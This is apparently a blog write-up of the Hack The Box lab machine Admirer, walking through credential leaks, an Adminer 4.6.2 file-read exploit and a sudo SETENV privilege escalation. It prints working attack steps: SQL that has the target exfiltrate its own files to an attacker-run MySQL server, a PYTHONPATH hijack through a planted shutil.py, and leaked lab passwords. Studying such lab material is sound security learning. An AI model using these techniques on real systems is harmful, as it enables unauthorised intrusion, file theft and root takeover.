---
layout: post
title: "The Database That Came to You"
subtitle: "HTB Admirer, where a database tool you log into reads your files instead of you reading its data, and a single environment variable becomes root"
date: 2020-10-03 12:00:00 +0000
description: "A database login form you connect to your own server, which then quietly hands you the box's source code, followed by one environment variable that turns a backup script into root."
image: /assets/og/the-database-that-came-to-you.png
tags: [hackthebox, writeup]
---

Admirer is a box about who is connecting to whom. You find a database login page and your instinct is to guess credentials, to break into its database, to be the client knocking on the server's door. The box flips that around. You stand up your own MySQL server, and you let the box log into yours. The moment it does, you ask it, very politely, to read its own files and send them over. It complies, because it thinks it is the customer and you are the shop. Then the climb to root is one word in an environment variable, a backup script that imports a library, and a library you got to write first. Nothing here is forced. Every door is held open by something that looked like a convenience.

```
        A D M I R E R
        =============
        adminer login:  pick a server to connect to
                        you point it at YOUR mysql
                              |
                              v
        "LOAD DATA LOCAL INFILE '/var/www/html/index.php'"
        the box, now a client, reads its own file
        and mails the contents to your server.
                              |
                              v
        then: sudo PYTHONPATH=/var/tmp ...
        python imports your shutil. you are root.
                                            鏡
```

## 0x01 · the doormat

Three ports answer, and the box is quiet about all of them. An `nmap -sC -sV` against 10.10.10.187 paints a tidy little Debian web host with nothing obviously rotten.

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7
80/tcp open  http    Apache httpd 2.4.25 (Debian)
```

No fossil versions, no smoking gun in the banners. `vsftpd 3.0.3` is the patched one, not the smiley-face backdoor. This is the kind of box where the front door is locked properly and the way in is something somebody left lying on the counter. So you read the counter. `robots.txt` is the first thing it hands you, and it is talking out of turn.

```
User-agent: *
Disallow: /admin-dir
```

A `robots.txt` is a sign on a door that reads "staff only," and it works exactly as well as a sign with no lock behind it. It does not stop anyone. It just tells you which door the owner cares about. There is even a note in there from a user named waldo about personal contacts and creds being stashed in that folder, which is the digital equivalent of taping the safe combination to the front of the safe.

## 0x02 · the folder that confessed

`/admin-dir` itself does not list, so you brute the names inside it. A `gobuster` run with a wordlist and a few extensions finds two text files sitting in the open.

```
$ gobuster dir -u http://10.10.10.187/admin-dir \
    -w directory-list-2.3-medium.txt -x php,txt
/contacts.txt    (Status: 200)
/credentials.txt (Status: 200)
```

`credentials.txt` is exactly what the name promises, and inside it is an FTP login.

```
[Internal mail account]
...
[FTP account]
ftpuser
%n?4Wz}R$tTF7
```

Log in over FTP and pull everything down. Two files matter, a database dump and a tarball of the website's own source code.

```
$ wget -m --user ftpuser --password '%n?4Wz}R$tTF7' ftp://10.10.10.187
... dump.sql
... html.tar.gz
```

That tarball is the whole game. When you can read an app's source, you stop guessing how it works and start reading how it works. Unpacked, it reveals a `utility-scripts/` directory, and an `index.php` carrying database credentials for waldo.

```php
$username = "waldo";
$password = "]F7jLHw:*G>UPrTo}~A\"d6b";
```

Those credentials feel like the answer. They are not. They open the database in the old source, but the live box has moved on, and that gap is the whole point of the next section. A password from a backup is a key to a lock that may already have been changed.

## 0x03 · the tool that logs into you

Inside `utility-scripts/` there is an Adminer page. Adminer is a single-file database management tool, the lighter cousin of phpMyAdmin, and the box is running version 4.6.2.

That version number is the door. Adminer 4.6.2 has a file-disclosure flaw, fixed only in 4.6.3, and it lives in a place nobody thinks to look, in the direction of the connection. Normally you are the client and the database is the server. You connect to it, you ask for rows, it answers. Adminer lets you choose which database server to connect to. So you point it at a MySQL server running on your own machine.

Picture a health inspector who shows up at a restaurant. Normally the restaurant hands over its records and the inspector reads them. But this inspector can be talked into the reverse. You set up a fake kitchen, you invite the restaurant's manager over as a guest, and the instant they walk in, you ask them to read aloud from the paperwork they brought in their own pocket. They do it, because in your kitchen they are the visitor, and visitors answer questions. The trick is `LOAD DATA LOCAL INFILE`. That MySQL feature reads a file from the *client's* disk and uploads it to the server. When the box connects to your MySQL as a client, you get to ask the client for its files.

Stand up a MySQL server you control on 10.10.14.4, make a database and a table to catch the loot, and let the box log in.

```sql
-- on your own mysql, grant the box room to connect
GRANT ALL PRIVILEGES ON *.* TO 'root'@'10.10.10.187' IDENTIFIED BY 'iceberg';
CREATE DATABASE pwn; 
CREATE TABLE pwn.exfil (data text);
```

Then in Adminer, connected to your server, you fire the read.

```sql
LOAD DATA LOCAL INFILE '/var/www/html/index.php'
INTO TABLE pwn.exfil
FIELDS TERMINATED BY "\n";
```

The box, acting as the humble client, reads its own live `index.php` off its own disk and ships every line into your table. Browse the table and there is the current waldo password, the one the box actually uses now.

```
$username = "waldo";
$password = "&<h5b~yK3F#{PaPB&dA}{H>";
```

That password is reused for the system account, so SSH walks you in.

```
$ sshpass -p '&<h5b~yK3F#{PaPB&dA}{H>' ssh waldo@10.10.10.187
waldo@admirer:~$ cat user.txt
████████████████████████████████
```

## 0x04 · the one word that became root

`sudo -l` is always the first question you ask as a new user, and waldo's answer is short and very loud.

```
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Read the `SETENV` and stop. Normally sudo scrubs your environment clean before it runs anything, because an environment variable is a sticky note an attacker can slip into the process. `SETENV` tells sudo to keep your sticky notes. That one tag is the entire privilege escalation. The rest is just finding which note the program reads.

`admin_tasks.sh` is a menu of housekeeping jobs, and option 6 backs up the web data by calling a Python script.

```python
# /opt/scripts/backup.py
from shutil import make_archive
src = '/var/www/html/'
dst = '/var/backups/html'
make_archive(dst, 'gztar', src)
```

The weak point is the very first line. When Python runs `from shutil import make_archive`, it goes looking for a file named `shutil.py`, and it searches a list of directories in order. That search order is controlled by an environment variable called `PYTHONPATH`. Think of it like a chef who is told to fetch flour and checks the pantries in a fixed order, grabbing from the first one that has a bag labeled "flour." If you can add your own pantry to the front of his list and put a bag of sugar in it labeled "flour," he never reaches the real one. You get to define what `shutil` means before the real `shutil` is ever found.

So write a `shutil.py` in a directory you own, give it a `make_archive` that does your bidding, and the `SETENV` tag lets you prepend that directory to `PYTHONPATH` for a root-run script.

```python
# /var/tmp/shutil.py
import os
def make_archive(a, b, c):
    os.system("[ copy /bin/bash to /tmp/iceberg and mark the copy setuid-root ]")
```

Then run the blessed script with your pantry wired to the front.

```
waldo@admirer:~$ sudo PYTHONPATH=/var/tmp /opt/scripts/admin_tasks.sh 6
Running backup script in the background, it might take a while...
waldo@admirer:~$ /tmp/iceberg -p
iceberg-5.0# id
uid=1000(waldo) euid=0(root) gid=1000(waldo) egid=0(root)
iceberg-5.0# cat /root/root.txt
████████████████████████████████
```

The backup never ran. Python imported your `shutil` first, your `make_archive` dropped a setuid root shell, and the box did all of it on your behalf because one tag let one variable survive.

## 0x05 · the honest caveat

It is easy to file both halves of this box under "old bug, patched, move on." Adminer 4.6.3 closed the file read in 2018, and nobody serious is shipping 4.6.2 in 2026. But the shape of the Adminer flaw is not a fossil at all. It is the assumption that a connection only flows one way, that the side asking the questions is always the side in control. Any feature that lets a server become a client, that lets the inspector be invited to dinner, inherits the same risk. The same logic shows up in webhooks that fetch a URL you supply, in PDF renderers that load remote resources, in any "connect to your own instance" convenience. The danger is never the database. It is the reversal of who is trusting whom.

And the privesc is the part that should keep an admin awake, because nothing here was unpatched. There is no CVE on `admin_tasks.sh`. Somebody wanted waldo to be able to run a maintenance menu as root, and to make a few jobs work they added `SETENV` to skip the tedious environment scrubbing. That one convenience handed away the whole machine, because Python trusts an environment variable to decide what its own standard library means. You cannot patch your way out of a `SETENV` you typed on purpose. The fix is paranoia about the blast radius of every variable you let cross the privilege line.

## 0x06 · outro

```
the login form did not let you in.
it walked into your house instead, and read its own mail to you.

the backup script never backed anything up.
it imported a library you wrote, and called you root.

mind the direction of the connection. scrub the environment. wear black.

                                                            EOF
```

---

*HTB: Admirer, retired 26 Sep 2020. An easy Linux box that is really a lecture on reversed trust, a database tool that logs into you and a Python import path you got to define. The mirror still reflects in a lab and nowhere you don't own.*